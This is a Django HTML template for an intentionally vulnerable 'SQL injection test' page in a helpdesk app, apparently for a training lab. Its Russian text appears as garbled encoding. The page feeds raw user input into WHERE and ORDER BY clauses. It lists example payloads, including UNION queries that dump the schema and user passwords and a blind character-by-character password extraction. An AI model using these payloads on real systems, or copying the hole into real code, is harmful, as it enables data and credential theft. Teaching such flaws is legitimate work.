{% extends "helpdesk/base.html" %}

{% block title %}SQL Injection Test{% endblock %}

{% block content %}
<div class="container mt-4">
    <div class="alert alert-danger">
        <h4>‚ö† –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨: SQL INJECTION</h4>
        <p>–≠—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–∞–º–µ—Ä–µ–Ω–Ω—É—é SQL –∏–Ω—ä–µ–∫—Ü–∏—é. –ù–ò–ö–û–ì–î–ê –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –≤ production!</p>
    </div>

    <h1 class="mb-4">üíâ –¢–µ—Å—Ç SQL –∏–Ω—ä–µ–∫—Ü–∏–∏</h1>
    
    <!-- –§–æ—Ä–º–∞ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏ -->
    <div class="card mb-4 border-danger">
        <div class="card-header bg-danger text-white">
            <h5 class="mb-0">–í–≤–µ–¥–∏—Ç–µ SQL —É—Å–ª–æ–≤–∏–µ</h5>
        </div>
        <div class="card-body">
            <form method="GET" class="row g-3">
                <div class="col-md-8">
                    <label class="form-label">WHERE —É—Å–ª–æ–≤–∏–µ:</label>
                    <input type="text" name="where" class="form-control" 
                           value="{{ request.GET.where|default:'1=1' }}"
                           placeholder="1=1 OR title LIKE '%test%'">
                    <small class="text-muted">SQL –≤—ã—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è WHERE. –û–ü–ê–°–ù–û!</small>
                </div>
                <div class="col-md-4">
                    <label class="form-label">ORDER BY:</label>
                    <input type="text" name="order" class="form-control" 
                           value="{{ request.GET.order|default:'id' }}"
                           placeholder="id, title, created DESC">
                    <small class="text-muted">–ü–æ–ª–µ –¥–ª—è —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∏</small>
                </div>
                
                <div class="col-12">
                    <button type="submit" class="btn btn-danger">–í—ã–ø–æ–ª–Ω–∏—Ç—å SQL –∑–∞–ø—Ä–æ—Å</button>
                    <a href="{% url 'helpdesk:sql_injection_test' %}" class="btn btn-secondary">–°–±—Ä–æ—Å–∏—Ç—å</a>
                </div>
            </form>
        </div>
    </div>
    
    <!-- –ü—Ä–∏–º–µ—Ä—ã —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ -->
    <div class="card mb-4">
        <div class="card-header bg-warning">
            <h5 class="mb-0">üìö –ü—Ä–∏–º–µ—Ä—ã SQL –∏–Ω—ä–µ–∫—Ü–∏–π</h5>
        </div>
        <div class="card-body">
            <div class="row">
                <div class="col-md-6">
                    <h6>1. –ü–æ–ª—É—á–∏—Ç—å –≤—Å–µ —Ç–∏–∫–µ—Ç—ã:</h6>
                    <code class="d-block mb-2">where=1=1</code>
                    
                    <h6 class="mt-3">2. –ü–æ–ª—É—á–∏—Ç—å —Ç–∏–∫–µ—Ç—ã —Å –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã–º —Ç–µ–∫—Å—Ç–æ–º:</h6>
                    <code class="d-block mb-2">where=title LIKE '%secret%'</code>
                    
                    <h6 class="mt-3">3. –ü–æ–ª—É—á–∏—Ç—å —Ç–∏–∫–µ—Ç—ã —Å –≤—ã—Å–æ–∫–∏–º –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–æ–º:</h6>
                    <code class="d-block mb-2">where=priority > 7</code>
                </div>
                <div class="col-md-6">
                    <h6>4. UNION –∞—Ç–∞–∫–∞ (—Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –ë–î):</h6>
                    <code class="d-block mb-2 small">where=1=1 UNION SELECT name, sql, null FROM sqlite_master WHERE type='table'</code>
                    
                    <h6 class="mt-3">5. UNION –∞—Ç–∞–∫–∞ (–¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π):</h6>
                    <code class="d-block mb-2 small">where=1=1 UNION SELECT username, password, email FROM account_myuser</code>
                    
                    <h6 class="mt-3">6. Blind SQL injection:</h6>
                    <code class="d-block mb-2 small">where=1=1 AND (SELECT substr(password,1,1) FROM account_myuser WHERE username='admin')='a'</code>
                </div>
            </div>
        </div>
    </div>
    
    <!-- –û—Ç–ª–∞–¥–æ—á–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è -->
    {% if query %}
    <div class="card mb-4">
        <div class="card-header bg-info text-white">
            <h5 class="mb-0">–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π SQL –∑–∞–ø—Ä–æ—Å</h5>
        </div>
        <div class="card-body">
            <pre class="bg-dark text-light p-3 rounded"><code>{{ query }}</code></pre>
        </div>
    </div>
    {% endif %}
    
    <!-- –û—à–∏–±–∫–∞ -->
    {% if error %}
    <div class="alert alert-danger">
        <h5>‚ùå –û—à–∏–±–∫–∞ SQL:</h5>
        <pre class="mb-0">{{ error }}</pre>
    </div>
    {% endif %}
    
    <!-- –†–µ–∑—É–ª—å—Ç–∞—Ç—ã -->
    <h3 class="mb-3">–†–µ–∑—É–ª—å—Ç–∞—Ç—ã: {{ tickets|length }} –∑–∞–ø–∏—Å–µ–π</h3>
    
    {% if tickets %}
    <div class="table-responsive">
        <table class="table table-striped table-hover">
            <thead class="table-dark">
                <tr>
                    <th>–ö–æ–ª–æ–Ω–∫–∞ 1</th>
                    <th>–ö–æ–ª–æ–Ω–∫–∞ 2</th>
                    <th>–ö–æ–ª–æ–Ω–∫–∞ 3</th>
                </tr>
            </thead>
            <tbody>
                {% for ticket in tickets %}
                <tr>
                    <td>{{ ticket.0|default:"NULL" }}</td>
                    <td>{{ ticket.1|default:"NULL" }}</td>
                    <td>{{ ticket.2|default:"NULL" }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
    {% elif not error %}
    <div class="alert alert-info">
        <p class="mb-0">–ù–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥–æ–π SQL –∑–∞–ø—Ä–æ—Å.</p>
    </div>
    {% endif %}
</div>

<script>
// –ü—Ä–∏–º–µ—Ä—ã SQL –∏–Ω—ä–µ–∫—Ü–∏–π –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
const sqlExamples = [
    {name: "–í—Å–µ —Ç–∏–∫–µ—Ç—ã", sql: "1=1"},
    {name: "–°–µ–∫—Ä–µ—Ç–Ω—ã–µ —Ç–∏–∫–µ—Ç—ã", sql: "title LIKE '%secret%'"},
    {name: "High priority", sql: "priority > 7"},
    {name: "–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ë–î", sql: "1=1 UNION SELECT name, sql, null FROM sqlite_master WHERE type='table'"},
    {name: "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏", sql: "1=1 UNION SELECT username, password, email FROM account_myuser"}
];

function loadExample(index) {
    const example = sqlExamples[index];
    document.querySelector('input[name="where"]').value = example.sql;
}
</script>
{% endblock %}
